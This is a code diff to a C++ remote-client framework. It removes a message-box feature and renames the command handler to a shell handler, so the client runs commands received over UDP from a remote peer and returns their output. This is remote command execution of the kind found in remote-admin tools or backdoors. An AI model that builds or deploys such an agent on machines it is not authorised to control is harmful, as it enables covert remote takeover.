@@ -1,22 +1,5 @@
 #include "RemoteClientFrameWork.h"
 
-
-void ThreadMessageBox::run()
-{
-	MessageBox(NULL,m_MessageBox,"ÏûÏ¢",MB_OK|MB_SETFOREGROUND);
-}
-
-void ThreadMessageBox::Show( const char *message )
-{
-	m_MessageBox=message;
-	start();
-}
-
-ThreadMessageBox::ThreadMessageBox( const char * msg)
-{
-	Show(msg);
-}
-
 RemoteClientFrameWork G_RemoteFrameWork;
 
 RemoteClientFrameWork::RemoteClientFrameWork(void)
@@ -30,8 +13,8 @@ RemoteClientFrameWork::~RemoteClientFrameWork(void)
 
 BOOL RemoteClientFrameWork::Initialize()
 {
-	CmdProcess_IO cmdProcessIO;
-	if (!m_CMD.Initialize(cmdProcessIO))
+	XShellProcess_IO cmdProcessIO;
+	if (!m_Shell.Initialize(cmdProcessIO))
 	{
 		return FALSE;
 	}
@@ -69,7 +52,7 @@ void RemoteClientFrameWork::OnHeartBeat()
 
 void RemoteClientFrameWork::OnNetRecv( Cube_SocketUDP_I& __I)
 {
-	CmdProcess_O __O;
+	XShellProcess_O __O;
 
 	if (__I.in.sin_addr.S_un.S_addr!=m_to.sin_addr.S_un.S_addr)
 	{
@@ -80,14 +63,10 @@ void RemoteClientFrameWork::OnNetRecv( Cube_SocketUDP_I& __I)
 
 	switch(pack->TypeFLAG)
 	{
-	case PACKET_TYPEFLAG_CLIENT_CMD:
-		__O.Buffer=((Packet_Client_CMD *)__I.Buffer)->command;
+	case PACKET_TYPEFLAG_CLIENT_SHELL:
+		__O.Buffer=((Packet_Client_SHELL *)__I.Buffer)->command;
 		__O.size=strlen(__O.Buffer);
-		m_CMD.Send(__O);
-		ResponeSucceeded();
-		break;
-	case PACKET_TYPEFLAG_CLIENT_MSG:
-		m_Msg.Show(((Packet_Client_Message *)__I.Buffer)->message);
+		m_Shell.Send(__O);
 		ResponeSucceeded();
 		break;
 	default:
@@ -115,7 +94,7 @@ void RemoteClientFrameWork::OnNetRecv( Cube_SocketUDP_I& __I)
 
 }
 
-void RemoteClientFrameWork::OnCmdReply( char *r,int Size )
+void RemoteClientFrameWork::OnShellRespones( char *r,int Size )
 {
 	Packet_Client_Reply Reply;
 	strcpy_s(Reply.Reply,r);
@@ -142,7 +121,7 @@ void RemoteClientFrameWork::ResponeSucceeded()
 void RemoteClientFrameWork::Run()
 {
 	m_HeartBeat.start();
-	m_CMD.start();
+	m_Shell.start();
 	m_Net.start();
 }
 
